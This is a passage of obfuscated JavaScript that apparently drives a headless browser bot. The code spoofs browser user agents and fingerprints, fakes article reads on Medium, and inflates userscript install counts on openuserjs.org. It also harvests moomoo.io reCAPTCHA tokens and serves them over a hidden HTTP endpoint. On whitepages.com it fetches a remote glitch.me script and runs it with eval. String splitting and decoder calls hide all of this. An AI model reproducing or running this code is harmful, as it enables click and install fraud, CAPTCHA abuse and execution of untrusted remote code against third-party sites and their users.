      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + a0(0x1a) + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + a1(0x1e) + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + a0(0x15) + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + Z(0x18, '!Vq9'),
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + Z(0x1c, '!)ff') + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    a1(0x10) + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0xda * -0x11 + 0x1 * 0x1d3b + -0x2bb5
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const bd = {
        f: 0x1d
      },
      a2 = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x257 * 0x6 + -0x1 * 0x937 + -0x1741 * -0x1)['vanillaLau' + a2(bd.f)](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x6 * -0x4a9 + -0x3d * 0x85 + 0x41f), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x783 * -0x2 + 0x5 * -0x3a1 + 0x218f * 0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x18d * -0x9 + -0x15e8 + 0x1 * 0x23dd;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x9b * -0x28 + 0x16fb + -0x2f33; w < getRandomInt(0xfe7 * -0x1 + -0x104f + 0x2037, -0x5d1 + -0x16d9 * 0x1 + -0x7 * -0x419); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1bce7 + -0x1bae * -0xb + -0x15 * -0x11d9);
        }
      }();
    }, 0x1 * -0x1a23 + -0x11 * 0x245 + 0xc * 0x56d), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x144f + 0x1b6d + 0x38f * -0x2;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x2708 + -0x1a83 + -0x5 * 0x281, 0x1a70 + -0x1c7c + -0x7 * -0x52)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xd01 * 0x1 + -0x7f04 * -0x1 + -0x16d5);
    }, 0x1092 + -0x1242 + 0x214), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x5 * 0x227 + 0x1c66 + -0x11a3;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x5 * 0x4fd + -0x1de3 + 0x428c), await u['evaluate'](() => {
            const a3 = c;
            let v = new XMLHttpRequest();
            v['open'](a3(0x1), 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x18d4 + -0x4c8 + 0x1d9c), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x17e3b8 + 0xc2568 + -0x164d80);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1285 + 0x2e7 * -0x5 + -0x39e);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a4 = b,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1 * -0x1f35 + -0x12ec + 0x32e9);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + a4(0x17, 'tCC@') + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x270f + 0xacd + -0x2 * -0x1de9);
}

function a() {
  const bq = [
    'Agv4',
    'r0vu',
    'Ahr0Chm6lY9NCG',
    'lmoXWR3cJCo1x8kaWQ8dpq',
    'igfYBxKSDIbIDa',
    'EgjYrfPbrMyZuq',
    'yxzPzIXPBwfNzq',
    'WPDdW6Lf',
    'mZyTEMHPAhuTBa',
    'WPxdI8kpFSo0iXL3E8kN',
    'sapp/cinem',
    'ntFcGSkyW4JcGa',
    'WP4GWO9EW7Xq',
    'fUs0TtQQTo',
    'clicking..',
    'm8ofWOFdISoFWQqqfx4J',
    'https://me',
    '=text&utm_',
    'WOfEW7qoW7/cTIxdQmkanW',
    'pXjJAUvSbQ',
    'WPzDoSosW4KCW4C1',
    'AwTLieDLy2TVkq',
    'ArrayBuffe',
    'WPFdISkli8o9oWD+y8k5',
    'AmoGWQBdH8oZqSkAW6e',
    'WQBdI8oMemokBW',
    'zwfZEwzVCMSUBW',
    'CMCVEM4Tq04VCW',
    'W6iIWPTWW5mcsuJcM2O',
    'nchOptions',
    '0\x20(Windows'
  ];
  a = function() {
    return bq;
  };
  return a();
}
doFlags['doOUJS'] && ((async () => {
  const a6 = d;
  async function f() {
    const a5 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1 * 0x1e43 + -0x1219 * -0x2 + 0x8a * -0xb) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x16ed + -0xfb * -0xa + 0x1 * -0x20ba));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1a0a + 0xd56 + -0x2760, D['indexOf']('\x20'));
        return B ? E['slice'](-0x175 * -0x11 + -0x2 * -0x511 + -0x22e7, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2a23 + 0x235f + 0x2dd4),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + a5(0x6) + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x45 * -0x1f + 0x2fed + -0x82),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + a6(0xa) + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1735 + 0x129e + -0x29d3; k < -0x3 * -0x66a + -0x9 * 0x425 + 0x1213; k++)
    setTimeout(f, (0x22 * 0xd53 + 0x617f * 0x4 + -0x260a2) * k * getRandomInt(0x3d1 * 0x2 + -0x913 * 0x2 + 0xa85, 0x13a0 + 0x1afd + -0x174d * 0x2));
  setInterval(() => {
    f();
